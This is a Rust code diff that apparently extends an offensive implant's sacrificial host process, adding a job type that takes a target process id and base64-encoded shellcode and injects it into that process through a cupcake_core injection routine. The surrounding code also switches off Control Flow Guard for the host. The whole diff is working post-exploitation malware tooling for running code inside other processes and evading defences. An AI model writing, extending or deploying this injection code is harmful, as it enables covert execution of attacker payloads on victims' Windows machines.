@@ -16,6 +16,8 @@ use std::io::{Read, Write};
 
 const KIND_BOF: u32 = 1;
 const KIND_DOTNET: u32 = 2;
+/// Inject job: payload = UTF-8 JSON {pid,data,method,wait_ms} — runs only in this host PE.
+const KIND_INJECT: u32 = 3;
 
 fn main() {
     #[cfg(windows)]
@@ -31,10 +33,10 @@ fn main() {
 #[cfg(windows)]
 fn disable_cfg_for_host() {
     // ProcessMitigationPolicy for Control Flow Guard — soft-fail if API missing
-    type SetProcessMitigationPolicyFn =
-        unsafe extern "system" fn(u32, *const u8, usize) -> i32;
+    type SetProcessMitigationPolicyFn = unsafe extern "system" fn(u32, *const u8, usize) -> i32;
     unsafe {
-        let k32 = winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
+        let k32 =
+            winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
         if k32.is_null() {
             return;
         }
@@ -131,6 +133,13 @@ fn run() -> Result<(), String> {
             });
             (r.stdout, r.stderr)
         }
+        KIND_INJECT => {
+            // JSON inject request — must not run in Stage0; this sacrificial host only.
+            match run_inject_job(&payload) {
+                Ok(msg) => (msg, String::new()),
+                Err(e) => (String::new(), e),
+            }
+        }
         _ => (String::new(), format!("unknown kind {kind}")),
     };
 
@@ -143,6 +152,48 @@ fn run() -> Result<(), String> {
     }
 
     write_result(stdout.as_bytes(), stderr.as_bytes())
+}
+
+fn run_inject_job(body: &[u8]) -> Result<String, String> {
+    #[cfg(windows)]
+    {
+        use base64::Engine;
+        let v: serde_json::Value =
+            serde_json::from_slice(body).map_err(|e| format!("inject json: {e}"))?;
+        let pid = v.get("pid").and_then(|x| x.as_u64()).ok_or("missing pid")? as u32;
+        let data_b64 = v
+            .get("data")
+            .and_then(|x| x.as_str())
+            .ok_or("missing data")?;
+        let method = v.get("method").and_then(|x| x.as_str()).unwrap_or("auto");
+        let wait_ms = v.get("wait_ms").and_then(|x| x.as_u64()).unwrap_or(0) as u32;
+        let mut sc = base64::engine::general_purpose::STANDARD
+            .decode(data_b64.trim())
+            .map_err(|e| format!("b64: {e}"))?;
+        let result = cupcake_core::inject_shellcode(pid, &sc, method);
+        for b in sc.iter_mut() {
+            *b = 0;
+        }
+        match result {
+            Ok(r) => {
+                if wait_ms > 0 {
+                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, wait_ms);
+                } else {
+                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, 0);
+                }
+                Ok(format!(
+                    "injected pid={} addr=0x{:x} method={}",
+                    r.pid, r.remote_addr, r.method
+                ))
+            }
+            Err(e) => Err(format!("inject: {e}")),
+        }
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = body;
+        Err("inject: windows only".into())
+    }
 }
 
 fn write_result(stdout: &[u8], stderr: &[u8]) -> Result<(), String> {
